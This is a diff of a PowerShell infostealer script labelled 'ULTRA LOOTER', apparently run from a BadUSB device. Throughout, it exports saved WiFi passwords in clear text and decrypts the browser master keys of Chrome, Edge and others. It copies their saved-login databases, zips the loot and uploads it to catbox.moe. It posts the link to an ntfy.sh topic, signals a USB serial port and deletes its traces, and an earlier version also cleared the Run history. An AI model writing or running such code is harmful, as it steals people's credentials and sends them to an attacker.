@@ -1,25 +1,23 @@
 $topic = "data_stwealer_hideen_"
+Write-Host "=== [ ULTRA LOOTER v2.4: DEP-LOADER ] ===" -ForegroundColor Cyan
 
-Write-Host "--- DEBUG START ---" -ForegroundColor Cyan
-
-# 1. Setup & Library Load
+# 1. FORCE LOAD SECURITY DLL (This fixes the 'Unable to find type' error)
 try {
-    Add-Type -AssemblyName System.Security -ErrorAction Stop
-    Write-Host "[+] Security DLL Loaded" -ForegroundColor Green
+    Add-Type -AssemblyName System.Security
+    Write-Host "[+] Security Libraries Loaded." -ForegroundColor Green
 } catch {
-    Write-Host "[-] Failed to load Security DLL: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "[-] Failed to load Security DLL." -ForegroundColor Red
 }
 
+# 2. Workspace Setup
 $dir = "$env:TEMP\LootBox"; $zip = "$env:TEMP\package.zip"
 if (Test-Path $dir) { Remove-Item -Recurse -Force $dir }; mkdir $dir | Out-Null
-Write-Host "[+] Folders Created at $dir"
 
-# 2. WiFi Export
-Write-Host "[*] Exporting WiFi..."
+# 3. WiFi Export
 netsh wlan export profile folder=$dir key=clear | Out-Null
-Write-Host "[+] WiFi Export Done"
 
-# 3. Browser Looting
+# 4. Chromium Decryption
+# We use $env:LOCALAPPDATA and $env:APPDATA to ensure it finds the CURRENT user
 $chromes = @{
     "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
     "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
@@ -33,41 +31,46 @@ foreach ($browser in $chromes.Keys) {
         try {
             $json = Get-Content $path -Raw | ConvertFrom-Json
             $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
+            
+            # This is the line that was failing:
             $unlockedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey[5..($encKey.Length-1)], $null, 'CurrentUser')
+            
             [System.BitConverter]::ToString($unlockedKey) -replace '-' | Out-File "$dir\${browser}_MasterKey.txt"
             
+            # Database Path Logic
             $dbPath = $path.Replace("Local State", "Default\Login Data")
             if ($browser -like "Opera*") { $dbPath = $path.Replace("Local State", "Login Data") }
             
             if (Test-Path $dbPath) {
+                # Attempt to copy even if locked
                 Copy-Item $dbPath -Destination "$dir\${browser}_LoginData.db" -Force -ErrorAction SilentlyContinue
+                Write-Host "    [+] ${browser}: Success" -ForegroundColor Green
             }
-            Write-Host "    [+] Grabbed $browser" -ForegroundColor Green
         } catch { 
-            Write-Host "    [-] Failed $browser : $($_.Exception.Message)" -ForegroundColor Yellow
+            Write-Host "    [-] ${browser} Error: $($_.Exception.Message)" -ForegroundColor Red
         }
+    } else {
+        Write-Host "    [?] ${browser}: Not installed or path wrong." -ForegroundColor Gray
     }
 }
 
-# 4. Packaging & Uploading
-Write-Host "[*] Zipping files..."
+# 5. Zipping and Uploading
 Add-Type -AssemblyName "System.IO.Compression.FileSystem"
 [System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)
-
-Write-Host "[*] Uploading to Catbox..."
 $link = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php
 
 if ($link -like "http*") {
-    Write-Host "[!] SUCCESS: $link" -ForegroundColor Green
     Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot Found: $link"
-    Write-Host "[+] ntfy Notification Sent"
-} else {
-    Write-Host "[-] UPLOAD FAILED. Response: $link" -ForegroundColor Red
+    Write-Host "[!] SUCCESS: $link" -ForegroundColor Green
+    
+    # --- THE SIGNAL ---
+    $portName = (Get-PnpDevice -FriendlyName "USB Serial Device*" -Status OK).Caption | Select-String -Pattern "COM(\d+)" | ForEach-Object { $_.Matches.Value }
+    if ($portName) {
+        # Final Attempt at Serial Signal
+        cmd.exe /c "echo F > $portName" 2>$null
+    }
 }
 
-# 5. GHOST CLEANUP (Commented out for Debugging)
-# Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*"
-# Remove-Item -Recurse -Force $dir, $zip
-
-Write-Host "--- DEBUG FINISHED ---"
-Write-Host "Window will NOT close. Check errors above."
+Write-Host "`n=== DEBUG FINISHED ===" -ForegroundColor Cyan
+Read-Host "Press Enter to Clean and Exit..."
+Remove-Item -Recurse -Force $dir, $zip
